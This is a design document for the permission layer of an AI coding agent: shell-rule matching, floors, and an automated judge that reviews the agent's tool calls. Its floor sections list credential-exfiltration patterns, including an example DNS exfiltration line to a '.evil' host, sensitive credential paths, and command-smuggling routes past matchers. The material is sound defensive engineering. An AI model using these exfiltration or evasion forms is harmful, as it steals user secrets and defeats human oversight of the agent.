# Permissions: always-allow baseline and judge slot

Status: decided 2026-10-14 (issue #28). P1a is implemented; P1b, P1c and P2 are planned.

This page carries the owner-approved direction for issue #28 into the repository. It has two goals:

- **P1:** make "Always allow" usable at roughly the level of Claude Code, Codex, opencode and Hermes, while keeping hard floors.
- **P2:** reserve one pluggable judge-model slot for automated review.

Source files and tests win where this page and the code disagree.

## What the references do (the parts we copy)

| Topic | Claude Code | Codex | opencode | Hermes |
|---|---|---|---|---|
| Shell rule | `Bash(npm run *)`. A trailing ` *` also matches the bare command. Every subcommand of `&& \|\| ; \| &` must match. Deny/ask also see `$()` and subshells. Unparseable input approves nothing. | `prefix_rule(pattern=[...], decision=allow\|prompt\|forbidden)`; most restrictive wins | `"git *": "allow"`, last match wins; prefix arity table | glob in `command_allowlist` |
| Precedence | deny > ask > allow, regardless of specificity | forbidden > prompt > allow | last match wins (rejected for Ave) | hardline > deny > allow |
| "Don't ask again" | allow rule per subcommand in local settings | rule in the user layer | session only | `config.yaml` allowlist |
| Auto judge | classifier never sees tool results; no verdict → deny; 3 consecutive / 20 total blocks → prompting | reviewer fails closed; 3 consecutive / 10 of 50 → turn stops | plugin hook | aux LLM; timeout = deny, not counted |

## Decisions

### P1: rules and "Always allow"

**1. One rules language and one parser** for Settings, the dock and the rule files. Implemented in `src/permissions/rules/rule-specifier.ts`.

| Rule | Matches |
|---|---|
| `Bash(<prefix> *)` | every command whose static argv starts with the prefix tokens, including the bare prefix |
| `Bash(<exact>)` | exactly that static argv |
| `Edit(<abs path>)` / `Edit(<abs dir>/**)` | one path, or a directory and everything under it |
| `WebFetch(domain:<host>)` / `WebFetch(domain:*.<host>)` | exact host, or strict subdomains (only a leading `*.`) |
| `Mcp(<server>)` / `Mcp(<server>:<tool>)` | every tool of a server, or one tool |

- Parsing is strict: anything outside the grammar throws.
- Storage uses one canonical spelling.
- Legacy Store A glob patterns (`web_fetch`, `write_file:path:/abs`) never start with `Name(`. They are classified by shape and keep their glob semantics unchanged.

**2. Precedence.** floors, then deny, then ask, then allow. Session allows count as allow.
- The first match within a class decides.
- Specificity never beats class.

**3. Shell matching** runs on the host's shell AST (`src/shared/shell-analysis.ts`, the mvdan/sh grammar). Implemented in `src/permissions/rules/shell-rule-matcher.ts`.
- Every simple command must be covered by some allow rule. Different rules may cover different parts.
- Deny and ask also look inside:
  - `$()`, backticks and process substitution;
  - subshells;
  - loop, conditional and function bodies;
  - assignment values;
  - through wrapper programs (`sudo -u root rm`).
- Unparseable input matches no allow rule.
- Wrappers are never stripped for allow.

**4. Prefix suggestion** uses an arity table (`src/permissions/rules/shell-prefix-policy.ts`).
- `git`, `npm`, `pnpm`, `yarn`, `docker` and `kubectl` keep 2 tokens.
- `npm run`, `pnpm run`, `yarn run` and `bun run` keep 3 tokens.
- Everything else keeps 1 token.
- Options and paths end the prefix.

**4a. Refused prefixes** come from one shared list, which validates both suggestions and edited values:
- an empty prefix or bare `*`;
- shells;
- interpreters at any length (`python -c`, `node scripts/build.mjs`, `python -m x`), except `bun`/`deno` task verbs (`bun run build`, `deno task build`);
- wrappers at any length (`env`, `xargs`, `sudo`, `eval`, `exec`, `source`, `timeout`, `nice`, `unbuffer`, …);
- package runners alone (`npx`);
- multi-verb tools alone or with a leading option (`git`, `git -c`, `npm`);
- `npm exec`, `bun x` and similar.

Refused prefixes can still be approved once or for the session.

**5. Shell verdict.** The blanket `shell → high` in `resolveUserApprovalVerdict` is no longer the first answer.
- An unreviewed shell ask carries the host's rule-classifier verdict (`ApprovalRequest.ruleVerdict`): read-only is LOW, ordinary is MEDIUM, destructive is HIGH.
- Destructive commands stay once-only.
- With no verdict at all, the fallback is still HIGH (fail closed).

**6. Persistence.**
- "Always allow" for a project writes the per-project rule file in Ave home: `<ave home>/permissions/project-rules/<identity>.json`. The identity is the Store B working-directory identity of the project root (sha256 of the case-folded canonical realpath). The project root is the git root of the session cwd, or the cwd itself outside a repository, so subdirectory sessions share rules. The file is re-read when it changes on disk. Ave never writes rules into the user's repository.
- "Everywhere" writes the user-global scope, which is Store A (`<ave home>/permissions.json`) extended in place.
- Deny-always uses the same files.
- Session scope is the conversation session id, in memory.

**7. Existing Store B entries** (exact tuples) keep matching unchanged and are never converted to prefixes.
- A corrupt Store A, Store B or project file fails clearly with a visible error.
- Corrupt files are never silently dropped and never overwritten.

**8. Writes.**
- Write rules are path-scoped `Edit(<root>/**)`, resolved with realpath at decision time.
- Sensitive paths and Ave's own config, permission and hook files are floors, checked before any allow rule.
- Symlink escapes ask.

**9. Network.** `WebFetch(domain:...)` rules feed the existing host-mediated allow-list. There is no direct egress.

**10. MCP.**
- Always-allow is per tool by default; per server is an explicit option.
- A destructive annotation, or no annotation, keeps ask. Annotations never auto-allow by themselves.

**11. Out-of-directory.** The dock offers depth candidates (file, parent, project-like root) resolved by the host.

**12. Floors.** These are never always-allowable, in any mode:
- sensitive and secret paths;
- Ave config, permission stores and hooks;
- hardline destructive patterns;
- credential exfiltration;
- privilege escalation;
- plugin and agent capability grants.

### P2: judge slot

**1. One seam.** `PermissionJudge` is the single automated-decision interface.
- The existing auto-mode reviewer (`LlmRiskClassifier`, `max(rule, llm)`, verdict cache, deferred queue) moves behind it as the `builtin-llm` provider, with no behavior change.
- jev is a drop-in provider.

**2. Settings.** `permissions.judge = { provider: "off" | "builtin-llm" | "external", mode: "shadow" | "active", categories: { shell, write, network }, external: { command | url } }`.
- The default provider is `off`.
- When the provider is not `off`, the mode defaults to `shadow`.
- The categories default to shell and write on, network off.

**3. Placement.** floors, then deny, then ask, then allow rules, then the mode matrix, then the judge, then the dock.
- The judge decides only calls that are still undecided, and only for enabled categories.
- It never overrides a rule or a floor.
- It never decides capability grants, remote-controller requests or anything in `strict` mode.
- It may suggest a rule but never writes one.

**4. Input.**
- It receives the latest user messages, the normalized and redacted tool call, the cwd and project root, the sandbox state, the rule verdict, and the policy text and mode.
- It never receives tool results.
- The host's canonical DLP redactor runs before anything leaves the process.

**5. Output** uses the strict schema `{decision: allow|ask|deny, rationale, confidence?, suggestedRule?}`. Anything else counts as unparseable.

**6. External provider.**
- `command` is an argv array with an absolute path and no shell.
- `url` must be loopback or HTTPS.
- The `permissions.judge` subtree is itself a floor: the agent never writes it.

**7. Fallbacks.**
- Timeout, error, unparseable output or an unavailable judge: `ask` in the foreground; `deny` plus the deferred queue when headless.
- A fallback never allows.
- Timeouts are recorded apart from denials.

**8. Breaker.** 3 consecutive or 20 total judge denials per session pause automation and return to prompting. Subagents share the parent session's counter.

**9. Hooks.**
- `beforeJudge` may redact or short-circuit to ask/deny.
- `afterJudge` may only downgrade a decision.

**10. Audit.** Append-only JSONL, written by the existing audit writer.

### Deviations from the issue text

- The breaker counts per session (3 consecutive / 20 total) rather than per turn (10 of the last 50).
- `rule-only` is collapsed into `provider: off`.

## Delivery

All work lands on the category branch `integration/permissions`.

- **P1a** (this change): rules language, parser, shell matcher, refused list, arity suggestion, Store A extension with `ask`, per-project rule files, corrupt-file handling for Store A and B, removal of the blanket shell → HIGH. No UI.
- **P1b:** the dock (prefix suggestion, allow-session / deny-always, per-project vs everywhere), one Settings list with revoke across Store A, project files and Store B, and i18n.
- **P1c:** path-scoped `Edit`, host-scoped `WebFetch`, `Mcp`, and out-of-directory depth.
- **P2:** `src/permissions/judge/` is built in isolation. The auto-mode relocation and the judge call site land together after P1a.

## P1a implementation notes

### Where the code is

- `src/permissions/rules/rule-specifier.ts`: the grammar, plus the pure host and MCP matchers that P1c will wire in.
- `src/permissions/rules/shell-prefix-policy.ts`: the refused list and the arity suggestion.
- `src/permissions/rules/shell-rule-matcher.ts`: the AST walk and deny/ask/allow evaluation.
- `src/permissions/rules/rule-files.ts`: rule validation and `PermissionRulesFileCorruptError`.
- `src/permissions/rules/project-rule-files.ts`: per-project files in Ave home.
- `src/permissions/rules/rule-scopes.ts`: the project-scope cache for the synchronous decision path.

### Decision path

`PermissionManager.checkDetailed` takes two new context fields:
- `ruleSubject: { kind: "shell", command }`, set only for the canonical `bash` tool;
- `projectRulesCwd`, which the tool pipeline sets after awaiting `ensureProjectRulesLoaded`.

Checks run in this order:
1. Deny decides at layer 1.
2. A corrupt Store A, project file or Store B returns a forced ask that names the file for every non-read call. Reads keep the normal matrix so the app stays usable while the file is repaired (the repair UI is P1b). A corrupt Store B no longer blocks every tool call; the error is logged with the file name.
3. Ask decides at layer 2 as a forced, never-remembered prompt. Ask also wins over `allow` mode.
4. Allow decides at layer 3.

The Layer-numbered gates already in place (remote controller, overlay, strict) are unchanged.

### Allow is refused for input the matcher cannot reason about

- parse failure or unsupported syntax (`case`, `select`, `((…))`, coprocesses);
- opaque word expansions (brace expansion, `${x/a/b}`, `$"…"`);
- any substitution;
- command-scoped or assignment-only environment changes (`GIT_DIR=… git status`, `PATH=…; git status`);
- write redirections other than `/dev/null`;
- function definitions;
- a dynamic program name;
- any command the rule classifier grades destructive (the floor).

### Deny and ask cannot see everything

For `Bash(...)` rule matching, they cannot see inside hidden code (`hiddenCodeReason` in `shell-prefix-policy.ts`, shared with the exfiltration floor). Visibility governs whether those rules can inspect execution; the shell floors below additionally classify the roles of arguments and data:
- a shell or interpreter given code by any route: `-c`/`-e`, a stdin pipe (`echo … | bash`), a here-string, a here-document, `-s`, `-`, a script file or module (`bash x.sh`, `perl x.pl`, `python -m x`); only `--version`/`--help` and `bun`/`deno` task verbs are visible;
- code carriers: `eval`, `source`/`.`, `trap`, `hash -p`, `alias`, `enable -f`, `bind -x`, `mapfile -C`, `complete -C`, `fc`, `at`, `crontab`, `tmux`, editors, string-joining wrappers (`watch`, `flock -c`, `su -c`, `env -S`);
- code-carrying variables (`GIT_SSH_COMMAND=… git fetch`, `PAGER`, `LESSOPEN`, `BASH_ENV`, `PATH`, …);
- options that run a command: `find -exec`, `sed` `e` / `s///e` / `-f`, `rg --pre`, `tar --to-command`/`-I`/`--use-compress-program`, `less +!`, `git -c`/`--ext-diff`/`--textconv`/`-O`/`--upload-pack`, `man -P`, `rsync -e`, `ssh -o ProxyCommand`, `fd -x`, …;
- unsupported syntax.

A deny rule that matches a visible command decides first. Otherwise, when any deny or ask `Bash(...)` rule exists and the command contains hidden code, the decision is a forced ask, even in `allow` mode. Hidden code is never covered by an allow rule. Options that write (`sed -i`/`w`, `tar -x`, `less -o`, `--output`, `find -delete`) also keep an allow rule from matching.

### Not yet enforced

`Edit`, `WebFetch` and `Mcp` rules parse but are not enforced yet. Writing them is refused, and a file that holds one is corrupt. This stops a stored rule from being a silent no-op that the user believes is in force. P1c lifts this by adding their kinds to `ENFORCED_RULE_KINDS`.

### Shell floors

Shell floors reuse the rule classifier's destructive regex (`isDestructiveShellText`). Sensitive-path arguments to shell commands remain enforced by `src/tools/shell-path-policy.ts` at execution, independently of rules.

**Sensitive-path floor** (`shellSensitivePathSignal`). A path from `sensitive-paths.ts` anywhere in the command line — any word, `=value`, `@file`, redirection, assignment, loop list, `$()`/backtick/process-substitution body, or the static text of hidden code — is never covered by an allow rule and forces a per-call ask in `checkDetailed` in every mode. `~`, `~user`, `$HOME` and `${HOME}` normalize to a home directory; other expansions (`$(echo ~)/.aws/credentials`) keep their literal tail; brace expansion is expanded; a glob is instantiated against the sensitive names that exist where it would expand.

**Credential-exfiltration floor** (`src/permissions/rules/shell-exfiltration.ts`). A command is exfiltration when one subcommand sends data off the machine and that data comes from a file or secret. It covers:
- `curl`/`wget` with a file-sourced body, header or upload: `@file`, `-F x=@`, `-T`, `--post-file`, or any argument built from a `$(…)` that reads a path;
- `scp`/`rsync` to a remote destination, and `sftp` to a host;
- `nc`/`ncat`/`socat` fed from a file, a here-string or a path-reading pipeline stage;
- sensitive-path arguments to a sender;
- any argument of a network-capable program built from a `$(…)` that reads a path (`nslookup $(cat key|base64).evil`), except multi-purpose tools whose arguments routinely carry file text (`git`, `gh`, `npm`, `docker`, …);
- reader-independent: a sensitive path anywhere (as above) together with a network-capable program (one shared table: `curl`, `wget`, `ssh`, `scp`, `rsync`, `openssl`, `nc`, `socat`, `telnet`, `nslookup`, `dig`, `gh`, `aws`, `gcloud`, `az`, `http`, `git`, …), a `/dev/tcp` or `/dev/udp` redirection, or hidden code anywhere in the same command line.

Senders are seen through wrappers, `busybox`, and static `sh -c` / `eval` / here-documents. The check applies to the whole compound command. It produces:
- a HIGH rule-classifier verdict on every substrate, including the disposable guest;
- no allow-rule match;
- a forced per-call ask in `checkDetailed`, in every mode.

**PowerShell** (`src/permissions/rules/powershell-exfiltration.ts`). Both floors apply to every host shell that runs a command string: the invocation pipeline gives the `bash` and `powershell` tools a shell rule subject with a `dialect`, and a subject without a known dialect is a contract violation. The PowerShell reading is the union of the bash floor over the same text and a PowerShell-aware pass:
- it knows cmdlets and aliases (`Invoke-WebRequest`/`iwr`, `Invoke-RestMethod`/`irm`, and `curl`/`wget`, their aliases in Windows PowerShell 5.1), parameter-name prefixes (`-InF`), `(…)`/`$(…)`/`{…}`/`@{…}` groups, assignments, `foreach (… in …)`, `$_` in a pipeline fed by file data, and `@p` splats of a hashtable assigned in the same command;
- senders: `-InFile`; any argument built from file data; pipeline input (it binds to `-Body`, like `… | curl -d @-`); `Start-BitsTransfer -TransferType Upload`; `Send-MailMessage -Attachments`; `Copy-Item -ToSession`; `WebClient.UploadFile` and `.NET` upload methods given file data; other network cmdlets (`Resolve-DnsName`, `Test-NetConnection`, …) given file data; a splat it cannot see on a network command;
- file data: `Get-Content`/`gc`/`cat`/`type`, `Select-String`, `Import-Clixml`, `Get-Item`, `[IO.File]::Read*`, secret stores (`Get-Secret`, `Get-StoredCredential`, `cmdkey`), `env:` drive listings, and variables assigned from any of them;
- the sensitive-path scan normalizes `$env:USERPROFILE`/`$env:HOME`/`${env:…}`/`$HOME`, `~\`, `\` separators, backtick escapes and `FileSystem::` prefixes;
- native switches are arguments to the native program. Ordinary development forms (`git log --oneline`, `git commit -m 'msg'`, `npm install --save-dev x`, `node --test`, `python -m pytest`, `dotnet test --no-build`) follow the normal permission flow when no other floor applies. The command table defines the modeled task/module and informational forms. Task forms accept literal or statically resolved scalar trailing argv, while interpreter code/preload options and unmodeled launcher payloads remain opaque. Arguments after an untouched literal script-file operand or a modeled module belong to that script/module; the existing script policy still applies. This does not establish that task or script contents are read-only;
- local write destinations and contents have distinct bindings. Ordinary values written to a known local file are data and follow normal permissions, including unresolved values and quoted command examples. Executed subexpressions and later execution of the written file retain their checks. Unknown destinations, remote shares and printer ports retain their upload checks. Supported here-string escapes are decoded; unsupported escapes stay opaque when consumed as paths, script text or other sink inputs, with a specific refusal reason;
- within one command input and its executed nested frames, established writes, copies, moves, renames, downloads and extraction taint destination paths and leaf/stem spellings. Later execution of a matching path or command requires approval. Modeled interpreter test/build discovery also requires approval after executable or untyped file writes; document types are enumerated in `powershell-file-provenance.ts`. Copied catalogue executables retain their identity through renames. Unknown native argv does not establish written paths. Provenance is not persisted across tool calls;
- package script runners (`npm`, `pnpm`, `yarn`, `bun`, and the shared `SHELL_PREFIX_POLICY.packageRunners` source, including `npx`, `corepack`, `yarnpkg` and `deno`) may interpret any file type, so a non-informational invocation after any established file write in the same input requires approval, including writes to `package.json` or a script referenced by an existing manifest. Runner identities use the provenance path normalization and executable suffixes from `POWERSHELL_FILE_TYPES`, including script shims. This check does not read or infer manifest contents. A runner without an earlier write, or an exact informational invocation (`--version`, `--help`, `-v`, `-h`), retains its existing checks, including opaque executable-file checks. Classifying a package runner as a runtime launcher requires arguments or an intrinsic code source; one-token persistent-prefix refusal applies independently. Other modeled discovery keeps the document exemption;
- runner-owned code options, verbs and command-forwarding forms come from one shared policy. Task options are data without a flag allowlist; global directory and workspace options consume literal values before identifying the verb. Inline-code options (including names that explicitly refer to code), code verbs and unresolved bindings require approval. Command forwarding and script-source options need proved bindings, while explicit task delimiters stop runner option parsing. Named local script operands retain their existing policy, including materialization checks; stdin and remote script sources remain opaque. Proved command operands retain downstream file-reader and sender checks in both shells, including original substitution metadata; network-capable forwarded commands remain opaque launchers in the PowerShell floor. A command-looking argument cannot establish a data role for a runner. Classification is bounded by 16 frames, 1,024 argv entries and 65,536 characters; exhaustion requires approval;
- `Invoke-Item`/`ii` accepts literal supported document/media/data types and explicit directory spellings. An unsuffixed literal path can also be admitted when `statSync(...).isDirectory()` confirms a directory in the current host context. The metadata exception is disabled after possible filesystem effects and in launcher/code-probe frames; queries consume the shared analysis budget. Missing extensionless paths, regular extensionless files, variables, expressions and splats require approval. File metadata does not prove future type stability or inspect file contents;
- top-level text the lexer cannot read unconditionally requires approval, with the specific parse refusal surfaced to the user; a regex fallback retains visible-upload detection. Quoted arguments without an established local-content role are inspected as code when they contain a transport, launcher or sensitive read. Exhausting the global or recursive work budget also requires approval.

As in bash, `$env:TOKEN` in a header (`curl -H "…$TOKEN"`) and plain `Invoke-WebRequest` GETs, `-OutFile` included, are not floored. The rule classifier grades the builtin `powershell` tool with the same reading.

PowerShell has no rule language. `Bash(...)` rules match `bash` only — they are not aliased to PowerShell in either direction — and a PowerShell call carries no project rule scope. `PowerShell(...)` is reserved for Claude Code's convention: a rule matcher there needs a PowerShell grammar the synchronous decision can read (the host's PowerShell AST needs a `pwsh` child), and without one it would approve almost nothing. Until then the floors, the rule classifier and the mode matrix decide PowerShell calls. `sensitive-paths.ts` carries the Windows credential stores as home-anchored rows marked `windows` (`AppData/Roaming|Local/Microsoft/Credentials`, `Microsoft/Protect` DPAPI master keys, `Microsoft/Crypto`, `Microsoft/Vault`, the PowerShell SecretStore under `AppData/Local/Microsoft/PowerShell/secretmanagement`, `AppData/Roaming/GitHub CLI`) plus a host-guard-only Chromium `User Data/**/Login Data` pattern; these match case-insensitively on every platform. Stores at the same profile location on every OS (`.ssh`, `.aws`, `.azure`, `.kube/config`, `.docker/config.json`, `.git-credentials`) stay single POSIX rows, which the anchor-free guard already matches under `C:/Users/<name>/`.

Plain GETs, form fields without `@`, local `rsync`, `scp` downloads and `git push` are unaffected.

### Gaps closed by P1b

The Settings IPC still accepts only allow/deny patterns without whitespace. Until P1b, `Bash(...)` rules are added through `PermissionManager.addRulePersist` (and removed through `removeRulePersist`).

## Tests

- `src/permissions/__tests__/rules-language.test.ts` covers:
  - the grammar;
  - the refused list;
  - the arity table;
  - compound commands, substitutions, wrappers and floors;
  - the `ls *` vs `lsof` case.
- `src/permissions/__tests__/rules-store-and-decision.test.ts` covers:
  - corrupt Store A, Store B and project files;
  - precedence across scopes;
  - ask beating `allow` mode;
  - persistence across restart;
  - sibling projects;
  - Store B coexistence;
  - the default-mode gate offering "remember" for `ls` / `npm test` but not `rm -rf`.
